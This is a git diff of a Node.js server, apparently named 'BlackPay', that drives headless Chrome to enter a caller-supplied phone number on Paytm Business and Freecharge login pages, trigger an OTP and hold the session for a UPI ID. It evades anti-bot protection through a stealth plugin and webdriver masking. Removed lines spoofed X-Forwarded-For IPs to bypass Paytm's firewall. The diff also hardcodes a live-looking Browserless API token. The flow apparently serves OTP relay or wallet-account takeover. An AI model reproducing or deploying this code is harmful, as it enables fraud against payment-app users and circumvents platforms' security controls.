@@ -2,7 +2,6 @@ const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
 
-// Puppeteer with Stealth Plugin
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 puppeteer.use(StealthPlugin());
@@ -14,7 +13,7 @@ app.use(cors());
 
 let activeSessions = {};
 
-app.get('/', (req, res) => res.json({ success: true, message: "BlackPay Master Server Running on RENDER (In-House)!" }));
+app.get('/', (req, res) => res.json({ success: true, message: "BlackPay Master Server Running with Browserless.io!" }));
 
 // Dummy Uono Hub Routes
 app.get('/next/micro/ar/all-customers', (req, res) => res.json({ success: true, data: [] }));
@@ -24,11 +23,14 @@ app.get('/next/micro/ca/approvals', (req, res) => res.json({ success: true, pend
 app.get('/next/micro/disbursal/disbursal', (req, res) => res.json({ success: true, balance: 0 }));
 
 // ==========================================
-// STEP 1: TRIGGER OTP VIA RENDER ITSELF (NO BROWSERLESS)
+// STEP 1: TRIGGER OTP VIA BROWSERLESS
 // ==========================================
 app.post('/api/start-tool', async (req, res) => {
     const { phone, walletType } = req.body;
     if (!phone) return res.status(400).json({ success: false, message: "Phone required" });
+
+    // TERA ASLI BROWSERLESS JUGAAD
+    const browserWSEndpoint = 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c561fc98136daa73b9388455b558503a&stealth=true&headless=false&--disable-blink-features=AutomationControlled';
 
     if (activeSessions[phone] && activeSessions[phone].browser) {
         try { await activeSessions[phone].browser.close(); } catch(e){}
@@ -37,31 +39,21 @@ app.post('/api/start-tool', async (req, res) => {
     activeSessions[phone] = { status: 'waiting_for_otp', upiId: null, browser: null, page: null };
 
     try {
-        console.log(`[+] Launching Chrome directly inside Render for: ${phone}`);
+        console.log(`[+] Connecting to Browserless.io for: ${phone}`);
         
-        // 🔥 NAYA MAJDUR: RENDER KE ANDAR ASLI CHROME 🔥
-        const browser = await puppeteer.launch({ 
-            headless: true, // Render cloud par screen nahi hoti
-            args: [
-                '--no-sandbox', 
-                '--disable-setuid-sandbox',
-                '--disable-dev-shm-usage', // RAM bachane ke liye
-                '--disable-gpu',
-                '--no-first-run',
-                '--no-zygote',
-                '--single-process',
-                '--disable-blink-features=AutomationControlled'
-            ]
+        const browser = await puppeteer.connect({ 
+            browserWSEndpoint: browserWSEndpoint,
+            defaultViewport: null
         });
 
         const page = await browser.newPage();
+        await page.setUserAgent('Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36');
+
         activeSessions[phone].browser = browser;
         activeSessions[phone].page = page;
 
         if (walletType.toLowerCase().includes('freecharge')) {
             console.log(`[!] Opening Freecharge for ${phone}...`);
-            await page.setUserAgent('Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36');
-            
             await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded', timeout: 60000 });
             await new Promise(r => setTimeout(r, 3000)); 
 
@@ -75,46 +67,32 @@ app.post('/api/start-tool', async (req, res) => {
             await page.keyboard.press('Enter');
 
         } else {
-            console.log(`[!] Opening Paytm Business (Render IP Bypass) for ${phone}...`);
+            console.log(`[!] Opening Paytm Business for ${phone}...`);
             
-            // 🔥 TRICK: Fake Indian IP aur Headers wahi rahenge
-            const randomIP = `49.36.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`; 
-
             await page.setExtraHTTPHeaders({
                 'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8,hi;q=0.7',
-                'X-Forwarded-For': randomIP,
-                'X-Real-IP': randomIP,
-                'Sec-Ch-Ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
-                'Sec-Ch-Ua-Mobile': '?0',
-                'Sec-Ch-Ua-Platform': '"Windows"',
                 'Sec-Fetch-Dest': 'document',
                 'Sec-Fetch-Mode': 'navigate',
                 'Sec-Fetch-Site': 'none',
-                'Sec-Fetch-User': '?1',
-                'Upgrade-Insecure-Requests': '1'
+                'Sec-Fetch-User': '?1'
             });
-
-            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36');
 
             await page.evaluateOnNewDocument(() => {
                 Object.defineProperty(navigator, 'webdriver', { get: () => false });
             });
 
-            const cacheBuster = Date.now();
-            const spoofedUrl = `https://dashboard.paytm.com/login/?ref=app&_t=${cacheBuster}`;
-            
-            await page.goto(spoofedUrl, { waitUntil: 'domcontentloaded', timeout: 60000 });
-            await new Promise(r => setTimeout(r, 4000)); 
+            await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'networkidle2', timeout: 60000 });
+            await new Promise(r => setTimeout(r, 3000)); 
 
             let pageText = await page.evaluate(() => document.body.innerText);
             if (pageText.toLowerCase().includes('server busy') || pageText.toLowerCase().includes('something went wrong')) {
-                console.log(`[!] RENDER IP BLOCKED: WAF ne IP pakad li.`);
-                throw new Error("Paytm Firewall Block (Server Busy)");
+                console.log(`[!] PAYTM BLOCKED IP: Server Busy dikha raha hai!`);
+                throw new Error("Paytm Anti-Bot Block (Server Busy)");
             }
 
             let inputField = await page.waitForSelector('input[type="tel"], input[name="mobileNumber"]', { timeout: 15000 });
             await inputField.focus(); 
-            await inputField.type(phone, { delay: 200 }); 
+            await inputField.type(phone, { delay: 150 }); 
 
             await page.evaluate(() => {
                 const btns = Array.from(document.querySelectorAll('button'));
@@ -124,9 +102,8 @@ app.post('/api/start-tool', async (req, res) => {
             await page.keyboard.press('Enter');
         }
         
-        console.log(`[!] OTP Triggered on Render Majdur for ${phone}`);
+        console.log(`[!] OTP Triggered on Browserless for ${phone}`);
 
-        // Fake success hat gaya, ab tabhi message jayega jab OTP sach mein bhej dega
         res.json({ success: true, message: "OTP sent! Waiting for input..." });
 
         setTimeout(async () => {
@@ -137,7 +114,7 @@ app.post('/api/start-tool', async (req, res) => {
         }, 180000);
 
     } catch (e) {
-        console.log(`[-] Render Error on ${phone}: ${e.message}`);
+        console.log(`[-] Browserless Error on ${phone}: ${e.message}`);
         if(activeSessions[phone]) {
             activeSessions[phone].status = 'failed';
             if (activeSessions[phone].browser) {
@@ -204,7 +181,7 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 API Server Running on Port ${PORT}`);
     
-    // 🔥 24/7 RENDER KEEP-ALIVE JUGAAD 🔥
+    // 24/7 Keep Alive
     setInterval(() => {
         axios.get(`http://localhost:${PORT}/`).catch(() => {});
         console.log("[+] 24/7 Keep-Alive Auto-Ping Sent!");
